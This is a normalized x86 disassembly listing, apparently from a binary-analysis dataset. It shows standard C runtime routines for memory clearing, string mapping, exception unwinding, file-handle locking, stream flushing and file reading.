pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_40ce90
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_40cefb
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_40cfb5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_405655
pop ecx
sub_40cfd5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40568f
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_40cfb5
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_4055c1
pop ecx
cmp eax ebx
je r-xdata
call sub_40e520
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_40cfb5
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_4055c1
pop ecx
cmp eax ebx
je r-xdata
call sub_40e520
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_40d1bc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40cfd5
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40d202
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40568f
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_40a4d0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40cfb5
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_4055c1
pop ecx
cmp eax ebx
je r-xdata
call sub_40e520
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_40d2e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_405cbc
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_40d202
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40d330
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40d350
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40568f
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40d395
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40d395
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40d350
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40d445
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40d464
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40d445
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40d467
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405939
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40d4ed
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40d556
push 0xc
push r--data
call sub_4082b0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40a6c4
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4082f5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d5ec
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_40d5f5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40d61c
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40e54c
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_40d660
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40d68b
push 0x10
push r--data
call sub_4082b0
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_40a6c4
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d71e
mov eax [ ebp - 0x1c ]
call sub_4082f5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_40e5ef
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_405655
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40d727
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40b3e6
pop ecx
push eax
call sub_40b0be
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40d78f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_40d727
pop ecx
test eax eax
je r-xdata
push esi
call sub_40d7d7
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40b3e6
push eax
call sub_40e663
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_40d7d7
push 0x14
push r--data
call sub_4082b0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40a6c4
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40d8a8
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_4082f5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_40b349
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_40d879
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_40d78f
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_40d78f
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_40d8ba
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_405655
push [ esi + 0x8 ]
call sub_405655
push [ esi + 0xc ]
call sub_405655
push [ esi + 0x10 ]
call sub_405655
push [ esi + 0x14 ]
call sub_405655
push [ esi + 0x18 ]
call sub_405655
push [ esi ]
call sub_405655
push [ esi + 0x20 ]
call sub_405655
push [ esi + 0x24 ]
call sub_405655
push [ esi + 0x28 ]
call sub_405655
push [ esi + 0x2c ]
call sub_405655
push [ esi + 0x30 ]
call sub_405655
push [ esi + 0x34 ]
call sub_405655
push [ esi + 0x1c ]
call sub_405655
push [ esi + 0x38 ]
call sub_405655
push [ esi + 0x3c ]
call sub_405655
add esp 0x40
push [ esi + 0x40 ]
call sub_405655
push [ esi + 0x44 ]
call sub_405655
push [ esi + 0x48 ]
call sub_405655
push [ esi + 0x4c ]
call sub_405655
push [ esi + 0x50 ]
call sub_405655
push [ esi + 0x54 ]
call sub_405655
push [ esi + 0x58 ]
call sub_405655
push [ esi + 0x5c ]
call sub_405655
push [ esi + 0x60 ]
call sub_405655
push [ esi + 0x64 ]
call sub_405655
push [ esi + 0x68 ]
call sub_405655
push [ esi + 0x6c ]
call sub_405655
push [ esi + 0x70 ]
call sub_405655
push [ esi + 0x74 ]
call sub_405655
push [ esi + 0x78 ]
call sub_405655
push [ esi + 0x7c ]
call sub_405655
add esp 0x40
push [ esi + 0x80 ]
call sub_405655
push [ esi + 0x84 ]
call sub_405655
push [ esi + 0x88 ]
call sub_405655
push [ esi + 0x8c ]
call sub_405655
push [ esi + 0x90 ]
call sub_405655
push [ esi + 0x94 ]
call sub_405655
push [ esi + 0x98 ]
call sub_405655
push [ esi + 0x9c ]
call sub_405655
push [ esi + 0xa0 ]
call sub_405655
push [ esi + 0xa4 ]
call sub_405655
push [ esi + 0xa8 ]
call sub_405655
push [ esi + 0xbc ]
call sub_405655
push [ esi + 0xc0 ]
call sub_405655
push [ esi + 0xc4 ]
call sub_405655
push [ esi + 0xc8 ]
call sub_405655
push [ esi + 0xcc ]
call sub_405655
add esp 0x40
push [ esi + 0xd0 ]
call sub_405655
push [ esi + 0xb8 ]
call sub_405655
push [ esi + 0xd8 ]
call sub_405655
push [ esi + 0xdc ]
call sub_405655
push [ esi + 0xe0 ]
call sub_405655
push [ esi + 0xe4 ]
call sub_405655
push [ esi + 0xe8 ]
call sub_405655
push [ esi + 0xec ]
call sub_405655
push [ esi + 0xd4 ]
call sub_405655
push [ esi + 0xf0 ]
call sub_405655
push [ esi + 0xf4 ]
call sub_405655
push [ esi + 0xf8 ]
call sub_405655
push [ esi + 0xfc ]
call sub_405655
push [ esi + 0x100 ]
call sub_405655
push [ esi + 0x104 ]
call sub_405655
push [ esi + 0x108 ]
call sub_405655
add esp 0x40
push [ esi + 0x10c ]
call sub_405655
push [ esi + 0x110 ]
call sub_405655
push [ esi + 0x114 ]
call sub_405655
push [ esi + 0x118 ]
call sub_405655
push [ esi + 0x11c ]
call sub_405655
push [ esi + 0x120 ]
call sub_405655
push [ esi + 0x124 ]
call sub_405655
push [ esi + 0x128 ]
call sub_405655
push [ esi + 0x12c ]
call sub_405655
push [ esi + 0x130 ]
call sub_405655
push [ esi + 0x134 ]
call sub_405655
push [ esi + 0x138 ]
call sub_405655
push [ esi + 0x13c ]
call sub_405655
push [ esi + 0x140 ]
call sub_405655
push [ esi + 0x144 ]
call sub_405655
push [ esi + 0x148 ]
call sub_405655
add esp 0x40
push [ esi + 0x14c ]
call sub_405655
push [ esi + 0x150 ]
call sub_405655
push [ esi + 0x154 ]
call sub_405655
push [ esi + 0x158 ]
call sub_405655
push [ esi + 0x15c ]
call sub_405655
push [ esi + 0x160 ]
call sub_405655
add esp 0x18
sub_40dc31
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
push esi
call sub_405655
pop ecx
sub_40dc9a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_405655
pop ecx
push esi
call sub_405655
pop ecx
sub_40ddb0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_40de00
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40de40
call sub_40c350
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40c35d
pop ecx
push 0x3
call sub_408256
int3
push 0x1
push 0x40000015
push 0x3
call sub_405759
add esp 0xc
sub_40de73
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_405939
and [ eax ] 0x0
call sub_405926
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_405939
mov [ eax ] ebx
call sub_405926
mov [ eax ] 0x9
call sub_4058d4
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_405939
mov [ eax ] ebx
call sub_405926
mov [ eax ] 0x9
jmp r-xdata
call sub_405939
mov [ eax ] ebx
call sub_405926
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_4058d4
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_407e59
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40a852
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_405926
mov [ eax ] 0xc
call sub_405939
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_405926
mov [ eax ] 0x9
call sub_405939
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_40594c
pop ecx
